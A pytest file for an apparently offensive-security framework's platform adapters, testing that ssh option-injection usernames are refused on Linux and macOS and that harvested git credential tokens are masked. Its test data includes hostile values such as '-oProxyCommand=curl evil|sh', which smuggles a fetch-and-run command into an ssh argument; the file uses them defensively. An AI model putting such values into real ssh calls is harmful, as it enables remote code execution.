"""Safety properties that must hold on EVERY platform adapter, not just one.

Both bugs pinned here were found by an audit and both had the same shape: a
protection that existed in the Linux adapter and simply was not present in the
macOS one. A safety check that lives on one platform and not its sibling is not
a safety check, it is an accident of which file someone happened to be reading.
So these tests walk the adapters rather than naming a single module — a third
adapter added later is covered the day it appears, without anyone remembering
to come back here.
"""

from __future__ import annotations

import pytest

from whetstone.adapters.base import AdapterError, reject_option_injection


class TestOptionInjection:
    """argv lists remove COMMAND injection; they do not remove OPTION injection.

    ``ssh`` reads any argv element beginning with ``-`` as an option, and
    ``-oProxyCommand=...`` executes a command. A username and a destination
    have no legitimate leading dash, so they are refused.
    """

    @pytest.mark.parametrize("hostile", [
        "-oProxyCommand=curl evil|sh",
        "-obatchmode=no",
        "--config=/tmp/evil",
        "-F/tmp/evil_ssh_config",
    ])
    def test_dash_leading_values_are_refused(self, hostile):
        with pytest.raises(AdapterError, match="option injection"):
            reject_option_injection(hostile)

    @pytest.mark.parametrize("ok", ["root", "operator", "10.0.0.5", "host.example"])
    def test_ordinary_values_pass(self, ok):
        reject_option_injection(ok)          # must not raise

    @pytest.mark.parametrize("module_name", ["linux", "macos"])
    def test_lateral_move_refuses_a_hostile_username_on_every_platform(self, module_name):
        """The parity property, exercised rather than grepped for.

        An earlier version of this test asserted that the string
        "reject_option_injection" appeared in the module source. It passed with
        the guard call DELETED, because the import line still contained the
        name — a test that cannot fail, which is the exact defect class the
        audit that produced this file was hunting. So this drives the real
        adapter instead.

        ``execute`` is the entry point the gate actually submits to, and it
        deliberately converts an adapter exception into ``ok=False`` rather than
        letting it unwind an engagement. So the assertion is on the refusal a
        caller really sees. No subprocess runs either way: the guard is checked
        before ssh is invoked, which is the point of checking it there.
        """
        import importlib

        import whetstone.verbs  # noqa: F401  (registers the catalogue)
        from whetstone.actions import REGISTRY

        mod = importlib.import_module(f"whetstone.adapters.{module_name}")
        adapter_cls = next(
            v for v in vars(mod).values()
            if isinstance(v, type) and getattr(v, "__module__", "") == mod.__name__
            and v.__name__.endswith("Adapter"))

        verb = REGISTRY.get("postex.lateral_move")
        action = REGISTRY.bind(
            "postex.lateral_move",
            {"method": "ssh", "as_user": "-oProxyCommand=curl evil|sh"},
            target="10.0.0.5")

        obs = adapter_cls().execute(verb, action)
        assert not obs.ok, (
            f"{module_name}: a username beginning with '-' reached ssh, where "
            "it is parsed as an option and -oProxyCommand executes a command")
        assert "option injection" in (obs.error or "").lower()


class TestCredentialMasking:
    """A credential-exposure verb must never print the credential.

    ``.git-credentials`` stores ``https://<token>@host`` in the token-as-
    username form every forge now recommends, so the "account name" parsed out
    of it IS the secret. The macOS adapter classed all account names as
    non-secret and its redact branch was a no-op besides — it copied the list
    and returned it unchanged.
    """

    def test_masking_keeps_the_prefix_and_destroys_the_rest(self):
        from whetstone.adapters.macos import _mask_account

        masked = _mask_account("ghp_16CharsOfEntropyHere")
        assert masked.startswith("ghp_"), "the provider prefix is the evidence"
        assert "16CharsOfEntropyHere" not in masked, "the secret must not survive"
        assert "len 24" in masked

    def test_short_values_leak_nothing(self):
        from whetstone.adapters.macos import _mask_account

        assert _mask_account("abc") == "***"

    def test_the_redact_branch_is_not_a_noop(self):
        """The original expression was `accts if not redact else [a for a in accts]`.

        That is a list copy on both sides, so the two branches were identical
        and ``redact=True`` did nothing. Any future edit that reintroduces an
        identity branch fails here.
        """
        from whetstone.adapters.macos import _mask_account

        accts = ["ghp_abcdefghijklmnop", "default"]
        assert [_mask_account(a) for a in accts] != accts
